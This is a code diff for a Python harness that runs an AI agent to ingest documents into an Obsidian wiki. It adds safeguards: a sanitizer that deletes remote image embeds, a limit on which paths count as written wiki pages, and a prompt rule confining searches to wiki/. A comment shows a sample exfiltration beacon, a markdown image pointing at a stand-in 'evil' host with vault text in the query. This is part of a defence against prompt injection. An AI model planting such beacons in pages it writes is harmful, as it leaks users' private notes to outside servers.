@@ -439,49 +439,57 @@ def verify_ingest(source_paths):
 
 
 # A remote image is a beacon: Obsidian fetches it when the page renders, so an injected
-# ![](https://evil/?d=<vault text>) would ship whatever the child read. Local embeds stay.
-# "Remote" is any target that isn't a plain relative path: a scheme, //host, or an &# entity.
-_REMOTE = r"(?:[a-z][\w+.-]*:|//|&#)"
-REMOTE_IMAGE = re.compile(
-    r"!\[[^\]]*\]\([^)]*?" + _REMOTE + r"[^)]*\)"                            # ![alt, may span lines](target)
-    r"|^ {0,3}\[[^\]\n]+\]:[ \t]*<?\S*?" + _REMOTE + r".*$\n?"               # [label]: target, used by ![x][label]
-    r"|<(?:img|iframe|video|audio|source|embed)\b[^>]*?\b(?:src|srcset)\s*=\s*[\"']?[^\"'>]*?"
-    r"(?:https?:|//|&#)[^>]*>",
-    re.I | re.M)
-FENCE = re.compile(r"^(```|~~~).*?(?:^\1[^\n]*$|\Z)", re.M | re.S)
+# ![](https://evil/?d=<vault text>) would ship whatever the child read. A line goes when it holds
+# both a remote marker and an embed marker; plain links and local images have only one.
+# ponytail: line-level, no markdown parser, so code fences and inline code aren't spared and a
+# line that merely mentions both is dropped; the log names each one. Upgrade path: a real
+# markdown parser, if false deletions show up in the logs.
+REMOTE = re.compile(r"http\\*s?\\*:|//|&#", re.I)
+EMBED = re.compile(r"!\[|<(?:img|video|audio|iframe|embed|source)|poster=|srcset=|^\s*\[[^\]]*\]:", re.I)
+REFDEF_OPEN = re.compile(r"^\s*\[[^\]]*\]:\s*$")  # a reference definition whose destination is on the next line
 
 
 def strip_remote_images(paths):
-    """Remove remote images from the pages the child wrote (paths relative to the vault or
-    absolute), outside fenced code, naming each file it changed. Never fails the run."""
-    for p in sorted(set(paths)):
-        f = Path(p) if Path(p).is_absolute() else VAULT / p
+    """Delete remote-embed lines from the pages the child wrote, logging file and line number
+    for each. Never fails the run."""
+    for f in paths:
         try:
-            text = f.read_text(encoding="utf-8")
-            parts, n, last = [], 0, 0
-            for m in FENCE.finditer(text):  # code fences are kept verbatim
-                clean, k = REMOTE_IMAGE.subn("", text[last:m.start()])
-                parts += [clean, m.group()]
-                n, last = n + k, m.end()
-            clean, k = REMOTE_IMAGE.subn("", text[last:])
-            if n + k:
-                f.write_text("".join(parts) + clean, encoding="utf-8")
-                log(f"  stripped {n + k} remote image(s) from {f}")
+            lines = Path(f).read_text(encoding="utf-8").splitlines(keepends=True)
+            drop = set()
+            for i, line in enumerate(lines):
+                if REMOTE.search(line) and EMBED.search(line):
+                    drop.add(i)
+                elif (REFDEF_OPEN.match(line) and i + 1 < len(lines)
+                      and lines[i + 1][:1].isspace() and REMOTE.search(lines[i + 1])):
+                    drop |= {i, i + 1}
+            if drop:
+                for i in sorted(drop):
+                    log(f"  stripped remote embed {f}:{i + 1}: {lines[i].strip()[:120]}")
+                Path(f).write_text("".join(l for i, l in enumerate(lines) if i not in drop), encoding="utf-8")
         except (OSError, UnicodeDecodeError) as e:
             log(f"  image check skipped {f}: {e}")
 
 
 def written_paths(line):
-    """file_path of every Write/Edit call in one stream-json event line."""
+    """The wiki pages one stream-json event line writes: Write/Edit targets that resolve to a .md
+    under VAULT/wiki other than CLAUDE.md. Anything else is ignored, since a Write the guard will
+    deny still streams its tool_use event first."""
     if '"tool_use"' not in line:
         return []
     try:
         content = json.loads(line).get("message", {}).get("content") or []
     except (ValueError, AttributeError):
         return []
-    return [c["input"]["file_path"] for c in content
-            if isinstance(c, dict) and c.get("type") == "tool_use" and c.get("name") in ("Write", "Edit", "MultiEdit")
-            and isinstance(c.get("input"), dict) and isinstance(c["input"].get("file_path"), str)]
+    wiki, out = (VAULT / "wiki").resolve(), []
+    for c in content:
+        if not (isinstance(c, dict) and c.get("type") == "tool_use" and c.get("name") in ("Write", "Edit", "MultiEdit")
+                and isinstance(c.get("input"), dict) and isinstance(c["input"].get("file_path"), str)):
+            continue
+        real = (VAULT / c["input"]["file_path"]).resolve()  # an absolute file_path replaces VAULT
+        if (wiki in real.parents and real.suffix.lower() == ".md"
+                and real.name.lower() not in ("claude.md", "claude.local.md")):
+            out.append(real)
+    return out
 
 
 _SYSTEM_PROMPT_FILE = None
@@ -559,7 +567,8 @@ def ingest_to_wiki(source_paths, extra=""):
         "ensure every page you create or update has title and description frontmatter. "
         "Append ONE log entry at the END of wiki/log.md covering this batch. "
         "There is no shell in this session: use Grep, Glob, and Read to search and inspect, "
-        "and skip any doc step that says to run a script or the obsidian CLI."
+        "and skip any doc step that says to run a script or the obsidian CLI. "
+        "Glob and Grep must be given a path under wiki/."
         + (f"\nAdditional instructions for this batch: {extra}" if extra else "")
     )
     settings, roots = guard_settings()
@@ -598,7 +607,7 @@ def ingest_to_wiki(source_paths, extra=""):
             f.flush()
     returncode = proc.wait()
     watchdog.cancel()
-    strip_remote_images(written)  # whatever the outcome: a failed run can still have written pages
+    strip_remote_images(sorted(set(written)))  # whatever the outcome: a failed run can still have written pages
     if auth_failed:
         # The CLI can exit 0 on an auth-failed result, and its wording ("OAuth session expired and
         # could not be refreshed") matches none of AUTH_ERRORS, so report this explicitly instead
